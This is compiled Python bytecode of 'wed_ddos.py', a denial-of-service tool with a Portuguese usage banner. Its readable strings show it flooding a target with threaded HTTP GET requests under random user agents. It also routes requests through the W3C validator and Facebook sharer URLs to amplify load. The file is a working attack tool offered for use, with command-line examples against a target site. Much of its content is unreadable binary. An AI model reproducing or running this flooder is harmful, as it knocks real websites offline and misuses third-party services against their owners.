3

èZL  ã               @   s  d Z dZdZddlmZ ddlmZ ddlZddlZddl	Z	ddl
Z
ddlZddlZ
ddlZdd„ Zd	d
„ Zdd„ Zd
d„ Zdd„ Zdd„ Zdd„ Zdd„ Zeƒ Zeƒ Zedkreejƒdk rÆeƒ  eƒ  edtdetƒdƒ eƒ  eƒ  ej dƒ y0e	j	e	j!e	j"ƒZ#e#j$te%tƒfƒ e#j&dƒ W n4 e	j'k
rZ Z( zedƒ eƒ  W Y ddZ([(X nX xªxJe)e%t*ƒƒD ]:Z+e
j,edZ-d e-_.e-j/ƒ  e
j,edZ0d e0_.e0j/ƒ  qlW ejƒ Z/da1x:t1d!krÐda1ej d"ƒ t1d a1ej2t1ƒ ej2t1ƒ q¸W ej3ƒ  ej3ƒ  q^W dS )#z[1;32mz[1;34mz[1;36mé    )ÚQueue)ÚOptionParserNc               C   sN   g a t jdƒ t jdƒ t jdƒ t jdƒ t jdƒ t jdƒ t jdƒ t S )Nz>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14zJMozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0zRMozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3zjMozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)zyMozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7zmMozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)zXMozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1)ÚuagentÚappend© r   r   úwed_ddos.pyÚ
user_agent   s    






r   c               C   s   g a t jdƒ t jdƒ t S )Nz"http://validator.w3.org/check?uri=z,http://www.facebook.com/sharer/sharer.php?u=)Úbotsr   r   r   r   r   Úmy_bots   s    

r
   c             C   sZ   y>x8t jjt jj| dtjtƒidƒ}tdƒ tj	dƒ qW W n   tj	dƒ Y nX d S )Nz
User-Agent)Zheadersz2[91m=======>[92m WedteamDDoS [93m <=======[0m gš™™™™™¹?)
ÚurllibZrequestZurlopenZRequestÚrandomÚchoicer   ÚprintÚtimeÚsleep)ZurlZreqr   r   r   Ú
bot_hammering   s    "r   c             C   sÐ   y”xŽt dt d tjtƒ d ƒjdƒ}tjtjtjƒ}|j	tt
tƒfƒ |j|tt
tƒfƒrr|j
dƒ tdƒ n|j
dƒ tdƒ tjdƒ qW W n6 tjk
rÊ } ztd	ƒ tjdƒ W Y d d }~X nX d S )
NzGET / HTTP/1.1
Host: z

 User-Agent: Ú
zutf-8é   z3[93m =======> [91m WedteamDDoS [92m <=======[0mz[91mCONCLUIDO.....[0mgš™™™™™¹?z4[92m =======> [93m WedteamDDoS [91m <======= [0m)ÚstrÚhostr   r
   r   ÚencodeÚsocketÚAF_INETÚSOCK_STREAMÚconnectÚintÚportZsendtoZshutdownr   r   r   Úerror)ÚitemZpacketÚsÚer   r   r   Údown_it'   s    $


r!   c              C   s"   xt jƒ } t| ƒ t jƒ  qW d S )N)ÚqÚgetr!   Ú	task_done)r   r   r   r   Údos8   s    r%   c              C   s0   x*t jƒ } ttjtƒd t ƒ t jƒ  qW d S )Nzhttp://)Úwr#   r   r   r
   r	   r   r$   )r   r   r   r   Údos2=   s    r'   c               C   s   t dƒ tjƒ  d S )NuO  [92m
â–ˆâ–ˆâ•—    â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ–ˆ
â–ˆâ–ˆâ•‘    â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â•šâ•â•â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ•‘
â–ˆâ–ˆâ•‘ â–ˆâ•— â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â–ˆâ–ˆâ–ˆâ–ˆâ•”â–ˆâ–ˆâ•‘
â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•  â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•”â•â•â•  â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘
â•šâ–ˆâ–ˆâ–ˆâ•”â–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•   â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘ â•šâ•â• â–ˆâ–ˆâ•‘
 â•šâ•â•â•â•šâ•â•â• â•šâ•â•â•â•â•â•â•â•šâ•â•â•â•â•â•    â•šâ•â•   â•šâ•â•â•â•â•â•â•â•šâ•â•  â•šâ•â•â•šâ•â•     â•šâ•â•
[0m
[91m ###################                   +---------------------+
 # C0D3D By TsNt1x #    <--------->    | With CL4$H0V3RDR1V3 |
 ###################                   +---------------------+
[0m
[94m  PARA USAR O SCRIPT DoS / DDoS SIGA OS EXEMPLOS :
[0m
[93m#  python wed_ddos.pyc -t www.exemplo.com
#  python wed_ddos.pyc -t www.exemplo.com -p PORTA
[0m
)r   ÚsysÚexitr   r   r   r   ÚusageB   s    r*   c           	   C   sæ   t ddd} | jdddddtjtjd	 | jd
ddd
d | jdddddd | jdddddd | jdddddd | jƒ \}}tj|jdd  |jržt	ƒ  |j
d k	r°|j
a
nt	ƒ  |jd krÆd!an|ja|jd krÜd"a
n|ja
d S )#NFZHammers)Zadd_help_optionZepilogz-qz--quietzset logging to ERRORZstore_constÚloglevel)ÚhelpÚactionÚdestZconstÚdefaultz-tz--serverr   zTARGET >SITE ALVO< -s HOST/IP)r.   r,   z-pz--portr   r   z-p 80 >PADRAO 80)Útyper.   r,   z-kz--turboÚturboz-k 600 >PADRAO 600z-hz--helpr,   Ú
store_truezDICAS / DEFINICOES)r.   r-   r,   z%(levelname)-8s %(message)s)ÚlevelÚformatéP   éú   )r   Z
add_optionÚloggingZERRORÚINFOÚ
parse_argsZbasicConfigr+   r,   r*   r   r   r1   Úthr)ZoptpZoptsÚargsr   r   r   Úget_parametersW   s&    


r<   Ú__main__é   z'[92m INICIANDO O DDoS CONTRA --> [91mz
[93m PORTA: z[0mé   r   ú )ÚtargetTi  gš™™™™™¹?)4ZaaaZbbbZcccZqueuer   Zoptparser   r   r(   r   Z	threadingr7   Zurllib.requestr   r   r   r
   r   r!   r%   r'   r*   r<   r"   r&   Ú__name__ÚlenÚargvr   r   r   r   r   r   r   r   r   r   Z
settimeoutr   r    Úranger:   ÚiZThreadÚtZdaemonÚstartZt2r   ZputÚjoinr   r   r   r   Ú<module>   sb   8





